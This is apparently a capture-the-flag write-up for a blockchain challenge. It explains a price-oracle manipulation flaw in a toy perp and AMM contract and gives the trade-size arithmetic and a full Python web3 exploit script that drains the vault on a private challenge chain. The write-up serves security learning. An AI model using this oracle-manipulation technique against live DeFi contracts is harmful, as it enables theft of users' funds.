# [Glomma River Trading](https://nnsc.tf/challenges?challenge=blockchain_Glomma+River+Trading)

**Description:**

We see opportunities, not vulnerabilities.
Surely this is ethical.

## 1. Get the instance

Connect to the challenge launcher and request an instance:

```
ncat --ssl glomma-river-trading-28fde0ff01f2.chall.nnsc.tf 1337
```

Choose option `1`. You get back:

- an RPC endpoint for your private chain
- a private key for your player account
- the address of the deployed `Setup` contract

Keep these three values, you'll need them for the exploit script.

## 2. Read the contracts

Three files are provided `Setup.sol`, `HyperCore.sol`, `L1Read.sol`. `L1Read.sol` is just a helper that reads oracle prices, it isn't part of the explit path. The two contracts that matter are `Setup` and `HyperCore`.

### Setup.sol

```solidity
function isSolved() external view returns (bool) {
    return CORE.player() == player
        && CORE.vaultEquity() <= 100_000e6
        && CORE.collateral() >= 4_900_000e6;
}
```

Win condition: drain `vaultEquity` from 5,000,000e6 down to 100,000e6 or below, and pump `colateral` from 10,000e6 up to at least 4,900,000e6. In other words, move roughly 4.9 million units of value out of the vault and into your own account.

### HyperCore.sol

This is a toy model of a perp exchange plus a spot AMM, both sharing one price feed. Three actions matter:

```solidity
function _openPerp(uint64 size) private {
    require(size != 0 && perpSize == 0, "one long position");
    uint256 px = oraclePx(1);
    require(uint256(size) * px / CORE_SCALE <= collateral * MAX_LEVERAGE, "initial margin");
    perpSize = size;
    perpEntryPx = px;
}

function _buySpot(uint64 size) private {
    require(size != 0 && size % 100 == 0, "spot size");
    uint256 baseOut = size / 100;
    require(baseOut < spotBaseReserve, "spot liquidity");
    uint256 newBase = spotBaseReserve - baseOut;
    uint256 newQuote = (spotBaseReserve * spotQuoteReserve + newBase - 1) / newBase;
    uint256 quoteIn = newQuote - spotQuoteReserve;
    require(quoteIn <= collateral, "spot collateral");
    collateral -= quoteIn;
    spotBaseReserve = newBase;
    spotQuoteReserve = newQuote;
}

function _closePerp(uint64 size) private {
    require(size != 0 && size == perpSize, "position size");
    uint256 profit = uint256(size) * (oraclePx(1) - perpEntryPx) / CORE_SCALE;
    require(profit <= vaultEquity, "HLP insolvent");
    vaultEquity -= profit;
    collateral += profit;
    perpSize = 0;
}
```

The bug is straightforward once you see all three functions together. The perp's margin check and PnL both reference `oraclePx`, and `oraclePx` is nothing more than the ratio of the two spot reserves you yourself control through `_buySpot`. There is no slippage protection, no oracle staleness check, no cap on how far a single trade can move the reserves relative to pool depth, and nothing stopping you from opening a position, moving the price against the vault, then closing it. The AMM and the perp market are the same manipulable price source.

So the plan is:

1. Open a long perp while the price is still at its starting value.
2. Buy nearly all the base reserve out of the spot pool, which mechanically forces `spotQuoteReserve` up and therefore `oraclePx` up.
3. Close the perp. Profit is `size * (new price - entry price) / CORE_SCALE`, and that profit gets pulled straight out of `vaultEquity` into your `collateral`.

## 3. Work out the numbers

Starting state:

```
collateral       = 10,000e6
vaultEquity      = 5,000,000e6
spotBaseReserve  = 1,000e6
spotQuoteReserve = 1,000e6
oraclePx         = spotQuoteReserve * 1e6 / spotBaseReserve = 1,000,000
```

**Step A, how far can we push the price?**

`_buySpot` requires `quoteIn <= collateral`, and `collateral` is only 10,000e6 at this point, so that's the hard limit on how much of the pool we can drain. Solve for the largest `baseOut` such that the resulting `quoteIn` stays under 10,000e6. Working through the AMM formula, the largest valid `baseOut` is `909,090,909`, which requires `size = baseOut * 100 = 90,909,090,900`.

That trade leaves:

```
newBase  = 90,909,091
newQuote = 10,999,999,990
newPx    = newQuote * 1e6 / newBase = 120,999,999
```

So one trade moves the oracle price from 1,000,000 to about 121,000,000, roughly a 121x move, and it costs `quoteIn = 9,999,999,990` of the collateral.

**Step B, how big should the perp position be?**

The perp's margin check only cares about the price at open time, so with 10,000e6 collateral and 20x leverage the theoretical max size is `2e13`. But we can't just max it out: `_closePerp` reverts if profit exceeds `vaultEquity`. We need `profit` to land just under that ceiling, not over it.

```
profit = size * (newPx - entryPx) / CORE_SCALE
       = size * 119,999,999 / 1e8
```

Solving for the size that puts `profit` inside `[vaultEquity - 100,000e6, vaultEquity]` gives:

```
size_perp = 4,166,666,701,388
profit    = 4,999,999,999,998
```

That's comfortably inside the required window, and well under the margin cap of `2e13`, so the open won't revert either.

**Final state after all three actions:**

```
vaultEquity = 5,000,000,000,000 - 4,999,999,999,998 = 2       (<= 100,000e6 ✓)
collateral  = 10 (leftover from spot buy) + 4,999,999,999,998 = 5,000,000,000,008  (>= 4,900,000e6 ✓)
```

Both win conditions are satisfied.

## 4. Encode the transactions

All three actions go through the same entry point:

```solidity
function sendRawAction(bytes calldata data) external {
    require(msg.sender == player, "only player");
    require(data.length == 228 && bytes4(data[:4]) == hex"01000001", "bad action");
    (uint32 asset, bool isBuy,, uint64 size, bool reduceOnly, uint8 tif,) =
        abi.decode(data[4:], (uint32, bool, uint64, uint64, bool, uint8, uint128));
    require(tif == 3, "IOC only");
    ...
}
```

So each call to `sendRawAction` needs a 4-byte tag followed by an ABI-encoded tuple of `(uint32, bool, uint64, uint64, bool, uint8, uint128)`, where the second `uint64` and the trailing `uint128` are unused padding. `tif` must always be `3`. The three actions we need:

| Action     | asset  | isBuy | size              | reduceOnly |
| ---------- | ------ | ----- | ----------------- | ---------- |
| open perp  | 1      | true  | 4,166,666,701,388 | false      |
| buy spot   | 10,001 | true  | 90,909,090,900    | false      |
| close perp | 1      | false | 4,166,666,701,388 | true       |

Building this in Python with `eth_abi`:

```python
from eth_abi import encode
from eth_utils import keccak

sr_sel = keccak(text="sendRawAction(bytes)")[:4]

def build_action(asset, isBuy, size, reduceOnly, tif, u64=0, u128=0):
    inner = b"\x01\x00\x00\x01" + encode(
        ["uint32", "bool", "uint64", "uint64", "bool", "uint8", "uint128"],
        [asset, isBuy, u64, size, reduceOnly, tif, u128],
    )
    assert len(inner) == 228
    return sr_sel + encode(["bytes"], [inner])
```

All three calls go to the fixed `HyperCore` address, `0x3333333333333333333333333333333333333333`, not to the `Setup` contract address you were handed. `Setup` only exists to check the win condition.

## 5. Run the exploit

```python
from web3 import Web3
from eth_abi import encode
from eth_utils import keccak

RPC = "https://glomma-river-trading-rpc-XXXXXXXXXXXX.chall.nnsc.tf"
PRIVKEY = "0x..."   # from the launcher
SETUP_ADDR = Web3.to_checksum_address("0x...")  # from the launcher
CORE_ADDR = Web3.to_checksum_address("0x3333333333333333333333333333333333333333")

w3 = Web3(Web3.HTTPProvider(RPC))
acct = w3.eth.account.from_key(PRIVKEY)

sr_sel = keccak(text="sendRawAction(bytes)")[:4]

def build_action(asset, isBuy, size, reduceOnly, tif, u64=0, u128=0):
    inner = b"\x01\x00\x00\x01" + encode(
        ["uint32", "bool", "uint64", "uint64", "bool", "uint8", "uint128"],
        [asset, isBuy, u64, size, reduceOnly, tif, u128],
    )
    assert len(inner) == 228
    return sr_sel + encode(["bytes"], [inner])

size_perp = 4166666701388
size_spot = 90909090900

open_perp = build_action(1, True, size_perp, False, 3)
buy_spot = build_action(10001, True, size_spot, False, 3)
close_perp = build_action(1, False, size_perp, True, 3)

def send(data, label):
    nonce = w3.eth.get_transaction_count(acct.address)
    tx = {
        "from": acct.address,
        "to": CORE_ADDR,
        "data": data,
        "nonce": nonce,
        "gas": 2_000_000,
        "gasPrice": w3.eth.gas_price,
        "chainId": w3.eth.chain_id,
    }
    signed = acct.sign_transaction(tx)
    txh = w3.eth.send_raw_transaction(signed.raw_transaction)
    rcpt = w3.eth.wait_for_transaction_receipt(txh)
    print(label, rcpt.status, txh.hex())

core_abi = [
    {"inputs": [], "name": n, "outputs": [{"type": t}], "stateMutability": "view", "type": "function"}
    for n, t in [("collateral", "uint256"), ("vaultEquity", "uint256"), ("player", "address")]
]
setup_abi = [{"inputs": [], "name": "isSolved", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"}]
core = w3.eth.contract(address=CORE_ADDR, abi=core_abi)
setup = w3.eth.contract(address=SETUP_ADDR, abi=setup_abi)

send(open_perp, "open ")
send(buy_spot, "spot ")
send(close_perp, "close")

print("collateral:", core.functions.collateral().call())
print("vaultEquity:", core.functions.vaultEquity().call())
print("isSolved:", setup.functions.isSolved().call())
```

Install dependencies first if needed:

```bash
pip install web3 eth-abi eth-utils
```

Run it:

```bash
python3 exploit.py
```

Expected output:

```
open  1 <tx hash>
spot  1 <tx hash>
close 1 <tx hash>
collateral: 5000000000008
vaultEquity: 2
isSolved: True
```

Status `1` on each transaction means it didn't revert. `isSolved: True` confirms both win conditions are met on chain.

## 6. Get the flag

Reconnect to the launcher and pick option `2`:

```bash
ncat --ssl glomma-river-trading-28fde0ff01f2.chall.nnsc.tf 1337
```

```
1 - instance info
2 - get flag
action? 2
```

The server checks `Setup.isSolved()` on your instance and returns the flag in `NNS{...}` format.

[SCREEN01]
